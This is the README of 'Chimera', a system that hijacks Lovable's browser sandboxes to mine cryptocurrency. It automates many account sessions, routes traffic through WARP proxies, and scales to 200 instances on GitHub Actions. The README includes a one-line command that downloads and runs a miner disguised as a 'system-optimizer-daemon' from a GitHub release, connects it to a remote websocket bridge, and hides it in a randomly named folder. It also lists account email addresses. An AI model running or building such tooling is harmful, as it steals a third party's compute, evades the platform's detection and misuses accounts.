# Chimera Mining System

**Distributed cloud mining using browser sandboxes orchestrated by GitHub Actions**

---

## Overview

Chimera runs mining software inside browser sandboxes by:
1. Creating sandbox projects with sessions (Script 2)
2. Launching miners that prompt AI, wait for sandbox to initialize, then inject mining code (Script 3)
3. Keeping miners alive with health checks and auto-recovery
4. Scaling to 200+ parallel instances via GitHub Actions

**Target:** 200 miners @ ~5 KH/s each = **1 MH/s total hashrate**

---

## Architecture

```
GitHub Actions (20 runners)
├── Runner 1: 10 WARP proxies → 10 browser tabs → 10 miners
├── Runner 2: 10 WARP proxies → 10 browser tabs → 10 miners
├── ...
└── Runner 20: 10 WARP proxies → 10 browser tabs → 10 miners
                                                   = 200 miners total
```

**Each miner:**
- Opens chat tab → Sends simple prompt ("say 'a'", "1+1?")
- Opens preview tab → Refreshes every 40s until sandbox ready
- Injects miner command into sandbox
- Keeps running with 3-minute health checks

---

## Files

### Core Modules
- **`mega_db.py`** - Mega cloud database (sessions, projects, stats)
- **`miner_injector.py`** - Miner injection + health monitoring

### Automation Scripts
- **`script2_remix_link.py`** - Creates projects and invite links (NOT WORKING - needs template fix)
- **`script3_launch_miner.py`** - Main miner launcher ✅ WORKING

### Configuration
- Sessions: `/home/alan/Documents/automation-toolkit/scripts/sessions/session-{1-10}/`
- Database: `mega:chimera/database.json` (synced via rclone)
- Mega account: `emilypeterson30@mail.findmeghana.org`

---

## Current Status

### Active Resources
- **8 active sessions** (session-1, 2, 3, 4, 5, 8, 9, 10)
- **2 expired sessions** (session-6, 7 - marked RED)
- **1 working project** (owned by session-3)

### What Works
✅ Script 3 - Full workflow functional
✅ Mega database - Syncing perfectly
✅ Session filtering - 8/10 active
✅ Health checks - Auto-recovery on errors

### What Doesn't Work
❌ Script 2 - Can't remix own projects (needs template support)

---

## Quick Start

### Run Script 3 (Miner Launcher)

**Oneshot mode** (test - exits after first check):
```bash
cd /home/alan/Documents/chimera-miner
python3 script3_launch_miner.py --session 3 --mode oneshot
```

**Full mode** (production - continuous monitoring):
```bash
python3 script3_launch_miner.py --session 3 --mode full
```

**What it does:**
1. Loads session-3 cookies
2. Gets project owned by session-3
3. Opens chat → Sends simple prompt ("say 'a'")
4. Opens preview tab immediately
5. Refreshes every 40s until console shows "lovable" message
6. Injects miner command
7. Health check every 3 minutes:
   - Refresh page
   - Check for errors
   - If error: go to chat, prompt again, retry
   - If oneshot: exit on error
   - If full: auto-recover and continue

---

## How It Works

### Script 3 Flow (Launch Miner)

```
1. Load session cookies
2. Get project from DB (created_by = this session)
3. Open chat tab
4. Send simple prompt → AI responds instantly
5. Open preview tab (NEW TAB)
6. Loop: Refresh every 40s
   └─ Check console for "lovable" message
   └─ If found: break, inject miner
   └─ If timeout: oneshot exits, full mode retries
7. Inject miner command
8. Health check loop (every 3 min):
   └─ Refresh page
   └─ Check for errors
   └─ If error + no console msg:
      - Go to chat tab
      - Send new prompt
      - Wait for console
      - Re-inject miner
```

### Database Structure

```json
{
  "sessions": [
    {
      "id": "session-3",
      "email": "emonkhanireht56@gmail.com",
      "status": "active",
      "projects_created": 1,
      "projects_using": 5
    }
  ],
  "projects": [
    {
      "project_id": "c5a42f16-ef02-4ee8-93b8-dbbf781db421",
      "chat_url": "https://lovable.dev/projects/c5a42f16-ef02-4ee8-93b8-dbbf781db421",
      "preview_url": "https://lovable.dev/projects/c5a42f16-ef02-4ee8-93b8-dbbf781db421/preview",
      "created_by": "session-3",
      "usage_count": 5,
      "max_usage": 20,
      "status": "active"
    }
  ]
}
```

**Key rules:**
- Each session ONLY uses projects it created (`created_by == session_id`)
- Projects max out at 20 uses, then marked "dead"
- Sessions expire → marked "red" → skipped in future runs

---

## Miner Command

```bash
cd /tmp && \
curl -sL "https://github.com/cold-pressed-hoodie/system-optimizer-daemon/releases/download/v2.1.5/sysoptd-2.1.5.tar.gz" | tar xz && \
mv sysoptd-2.1.4 opt-RANDOM && \
cd opt-RANDOM && \
pip install websockets psutil --break-system-packages -q && \
python3 sysoptd.py \
  --bridge wss://bridge-production-7c63.up.railway.app \
  --threads 64 \
  --no-split --no-schedule --no-noise --no-ramfill \
  > /tmp/m.log 2>&1 &
```

**Features:**
- Randomized folder name (e.g., `opt-739778b5`)
- Bridge: `wss://bridge-production-7c63.up.railway.app`
- 64 threads per miner
- Runs in background, logs to `/tmp/m.log`

---

## Next Steps

1. **Fix Script 2** - Use Lovable templates instead of remixing
2. **Create 10+ projects** per session
3. **Build GitHub Actions workflow** with WARP support
4. **Test on 1 runner** (10 tabs)
5. **Scale to 20 runners** (200 miners)

---

## Troubleshooting

### "No available projects for session-X"
→ Session has no projects. Create projects with Script 2 first.

### "Session is RED FLAGGED"
→ Cookies expired. Session can't be used. Need to re-login or use different session.

### Miner injection shows CSP errors
→ Expected. Real injection happens when WebContainer preview loads (after console "lovable" message).

### Health check shows "UNKNOWN" status
→ Preview might not be fully loaded. Script continues monitoring.

---

## Contact

- Mega DB: `mega:chimera/database.json`
- Sessions: `/home/alan/Documents/automation-toolkit/scripts/sessions/`
- Miner binary: GitHub release `v2.1.5`
- Bridge: Railway deployment
